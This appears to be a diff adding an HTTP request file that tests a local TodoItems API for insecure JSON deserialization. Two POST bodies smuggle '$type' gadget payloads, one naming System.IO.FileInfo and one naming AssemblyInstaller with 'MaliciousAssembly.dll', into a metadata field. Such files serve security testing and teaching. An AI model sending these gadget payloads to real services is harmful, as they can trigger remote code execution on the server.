@@ -1,0 +1,37 @@
+GET https://localhost:7040/api/TodoItems HTTP/1.1
+
+###
+
+POST https://localhost:7040/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "walk dog1",
+  "isComplete": true,
+  "metadata":
+    {
+        "data2": {
+		"$type": "System.IO.FileInfo, System.IO.FileSystem",
+		"fileName": "rce-test.txt"
+	}
+    }
+}
+
+###
+
+POST https://localhost:7040/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "walk dog2",
+  "isComplete": true,
+  "metadata":
+    {
+        "data2":  {"$type":"System.Configuration.Install.AssemblyInstaller, 
+            System.Configuration.Install",
+            "Path":"MaliciousAssembly.dll"}
+    }
+}
+
+###
+GET https://localhost:7040/api/TodoItems HTTP/1.1
